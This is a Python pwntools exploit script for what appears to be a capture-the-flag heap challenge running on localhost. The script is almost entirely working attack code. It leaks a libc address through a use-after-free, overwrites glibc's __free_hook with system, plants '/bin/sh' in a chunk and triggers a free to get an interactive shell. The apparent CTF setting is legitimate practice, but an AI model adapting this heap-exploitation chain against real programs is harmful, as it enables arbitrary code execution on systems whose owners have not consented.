from pwn import *


def gacha(n):
    pc.sendlineafter(">", "1")
    pc.sendlineafter(":", str(n))
    result = pc.recvline_endswith("]")
    print("==Gacha {} times==".format(n))
    return result


def clear():
    pc.sendlineafter(">", "3")
    print("==Cleared==")


def ceiling(no, a, target):
    # padding target
    target = str(target)
    target = target[:2] + "0" * (18 - len(target)) + target[2:]
    print(target)

    temp = "0x" + target[-8:]  # as is processd by int, get 4bytes of _free_hook address
    print(temp)
    pc.sendlineafter(">", "4")
    pc.sendlineafter(">", str(no))
    pc.sendlineafter(">", str(a))
    pc.sendlineafter(">", str(int(temp, 16)))

    temp = target[
        -18:-8
    ]  # as is processd by int, get 4bytes with 0x of _free_hook address
    print(temp)
    pc.sendlineafter(">", "4")
    pc.sendlineafter(">", str(no))
    pc.sendlineafter(">", str(a + 1))
    pc.sendlineafter(">", str(int(temp, 16)))
    print("==Write {}-{} as {}==".format(no, a, target))


pc = connect("localhost", 9102)
# pc = process("./chall")

libc = ELF("./libc-2.31.so")

print("\n=====Leaking libc address=====")
gacha(100)
gacha(100)  # To avoid zero count check
gacha(500)
gacha(200)
clear()

libc_raw = gacha(200)[-21:]  # Read after free
# processing returned libc address
libc_leak = libc_raw[1:7] + libc_raw[12:-1]
libc_leak = libc_leak.decode("utf-8")
libc_leak = int(libc_leak, 16)

# calculating address
libc_base = libc_leak - 0x1EBBE0
free_hook = hex(libc_base + libc.symbols["__free_hook"])
system = hex(libc_base + libc.symbols["system"])

print("\n=====Result=====")
print("libc_leak <main_arena+96> : ", hex(libc_leak))
print("libc_base :", hex(libc_base))
print("__free_hook :", free_hook)
print("system :", system)

print("\n=====Preparing writing at __free_hook=====")
ceiling(0, 0, free_hook)

print("\n=====Reset history before malloc at __free_hook=====")
gacha(10)
gacha(10)

print("\n=====Malloc at __free_hook=====")
gacha(100)
gacha(100)  # at __free_hook

print("\n=====Writing system at __free_hook=====")
ceiling(1, 0, system)

print("\n=====Writing /bin/sh for free hook=====")

binsh = "0x"  # Write binsh in hex, little endian
for a in "/bin/sh"[::-1]:
    binsh += str(hex(ord(a)))[2:]

gacha(2)
ceiling(2, 0, hex(int(binsh, 16)))
print("\n=====Shelllllllllllllll=====")
clear()
pc.interactive()
